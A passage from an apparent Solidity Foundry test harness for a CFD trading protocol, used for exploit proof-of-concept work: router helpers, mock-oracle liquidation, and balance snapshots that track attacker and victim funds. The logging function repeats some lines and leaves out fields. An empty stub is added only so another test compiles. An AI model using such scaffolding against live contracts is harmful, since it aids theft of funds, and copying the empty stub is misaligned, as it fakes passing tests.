        result = _execute(id, price, keeper);
    }

    function _closeViaRouter(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 id = _commit(trader, _request(side, size, 0, true));
        result = _execute(id, price, keeper);
    }

    function _liquidateViaRouter(
        address account,
        uint256 price,
        address executor
    ) internal {
        bytes[] memory update = _mockPythUpdateData(price);
        vm.prank(executor);
        router.executeLiquidation(account, update);
    }

    function _assertExecuted(
        OrderV3Types.ExecutionResult memory result,
        string memory label
    ) internal pure {
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), label);
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Actors & funding
    // ---------------------------------------------------------------------------------------------------------------

    /// @dev Mints mock USDG to `trader` and deposits it into the clearinghouse (free settlement, no position margin).
    function _fundTraderCash(
        address trader,
        uint256 amount
    ) internal {
        _fundTrader(trader, amount);
    }

    function _positionSize(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Accounting snapshots: use these to show "who lost what" in a PoC
    // ---------------------------------------------------------------------------------------------------------------

    struct Snap {
        uint256 clearinghouseUsdg;
        uint256 poolUsdg;
        uint256 poolTotalAssets;
        uint256 seniorTotalAssets;
        uint256 juniorTotalAssets;
        uint256 attackerCustody;
        uint256 attackerWallet;
        uint256 victimCustody;
        uint256 attackerClaim;
    }

    function _snap() internal view returns (Snap memory s) {
        s.clearinghouseUsdg = settlementToken.balanceOf(address(clearinghouse));
        s.poolUsdg = settlementToken.balanceOf(address(pool));
        s.poolTotalAssets = pool.totalAssets();
        s.seniorTotalAssets = seniorVault.totalAssets();
        s.juniorTotalAssets = juniorVault.totalAssets();
        s.attackerCustody = clearinghouse.balanceAssets(attacker);
        s.attackerWallet = settlementToken.balanceOf(attacker);
        s.victimCustody = clearinghouse.balanceAssets(victim);
        s.attackerClaim = engine.traderClaimBalanceAssets(attacker);
    }

    function _logSnap(
        string memory label,
        Snap memory s
    ) internal pure {
        console2.log("==", label);
        console2.log("  clearinghouse USDG ", s.clearinghouseUsdg);
        console2.log("  pool USDG          ", s.poolUsdg);
        console2.log("  pool totalAssets   ", s.poolTotalAssets);
        console2.log("  senior totalAssets ", s.seniorTotalAssets);
        console2.log("  junior totalAssets ", s.juniorTotalAssets);
        console2.log("  attacker custody   ", s.attackerCustody);


        console2.log("  junior totalAssets ", s.juniorTotalAssets);
        console2.log("  attacker custody   ", s.attackerCustody);
        console2.log("  attacker wallet    ", s.attackerWallet);
    }

    /// @dev Total USDG held by protocol contracts. Useful conservation check: value can move between buckets but an
    ///      exploit typically shows this falling while an attacker's wallet rises by more than they put in.
    function _protocolUsdg() internal view returns (uint256) {
        return settlementToken.balanceOf(address(clearinghouse)) + settlementToken.balanceOf(address(pool))
            + settlementToken.balanceOf(address(seniorVault)) + settlementToken.balanceOf(address(juniorVault))
            + settlementToken.balanceOf(address(engine)) + settlementToken.balanceOf(address(router));
    }

    // Fix for F05_OrderExpiryTest: executeExt is called but not defined
    // Adding stub implementation
    function executeExt(uint64 cid, uint256 px) external virtual {
    }

}
```


